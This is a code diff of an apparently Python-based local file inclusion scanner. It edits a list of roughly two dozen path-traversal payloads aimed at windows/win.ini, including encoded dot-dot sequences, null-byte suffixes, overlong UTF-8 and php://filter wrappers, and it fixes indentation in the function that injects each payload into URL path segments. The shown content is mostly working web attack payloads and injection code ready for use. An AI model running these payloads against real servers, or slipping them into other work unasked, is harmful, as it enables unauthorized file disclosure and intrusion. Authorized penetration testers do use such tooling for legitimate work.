@@ -15,32 +15,32 @@ init(autoreset=True)
 
 # Configuration
 LFI_PAYLOADS = [
-    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini?",
-    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini?",
+    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini",
+    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini",
     "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00",
-    "/./././././././././././windows/win.ini?",
-    "/../../../../../../../../../../../windows/win.ini?",
-    "/..\\../..\\../..\\../..\\../..\\../..\\../windows/win.ini?",
-    "/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini?",
-    "..//..//..//..//..//windows//win.ini?",
-    "../../../../../../../../../../../../windows/win.ini?",
-    "../../windows/win.ini?",
-    "..\\../..\\../..\\../..\\../windows/win.ini?",
-    "..\\../..\\../windows/win.ini?",
-    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini?",
-    "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini?",
+    "/./././././././././././windows/win.ini",
+    "/../../../../../../../../../../../windows/win.ini",
+    "/..\\../..\\../..\\../..\\../..\\../..\\../windows/win.ini",
+    "/.\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini",
+    "..//..//..//..//..//windows//win.ini",
+    "../../../../../../../../../../../../windows/win.ini",
+    "../../windows/win.ini",
+    "..\\../..\\../..\\../..\\../windows/win.ini",
+    "..\\../..\\../windows/win.ini",
+    "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    "\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
     "/../../../../../../../../../../../windows/win.ini%00",
     "../../../../../../../../../../../../windows/win.ini%00",
     "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini%00",
     "/../../../../../../../../../../../windows/win.ini%00.html",
     "/../../../../../../../../../../../windows/win.ini%00.jpg",
-    "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../windows/win.ini?",
-    "../../../../../../../../windows/win.ini?",
-    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini?",
-    "c:\\windows\\win.ini?",
-    "c:/windows/win.ini?",
-    "php://filter/zlib.deflate/convert.base64-encode/resource=c:/windows/win.ini?",
-    "php://filter/zlib.deflate/convert.base64-encode/resource=c:\\windows\\win.ini?"
+    "..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../windows/win.ini",
+    "../../../../../../../../windows/win.ini",
+    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    "c:\\windows\\win.ini",
+    "c:/windows/win.ini",
+    "php://filter/zlib.deflate/convert.base64-encode/resource=c:/windows/win.ini",
+    "php://filter/zlib.deflate/convert.base64-encode/resource=c:\\windows\\win.ini"
 ]
 
 DEFAULT_TIMEOUT = 50
@@ -142,7 +142,7 @@ async def inject_lfi_payload(session, request, semaphore):
                 for payload in LFI_PAYLOADS:
                     modified_parts = path_parts.copy()
                     modified_parts[i] = part + payload
-                   modified_path = '/'.join(path_parts[:i] + [payload])
+                    modified_path = '/'.join(path_parts[:i] + [payload])
                     new_url = parsed_url._replace(path=modified_path).geturl()
 
                     try:
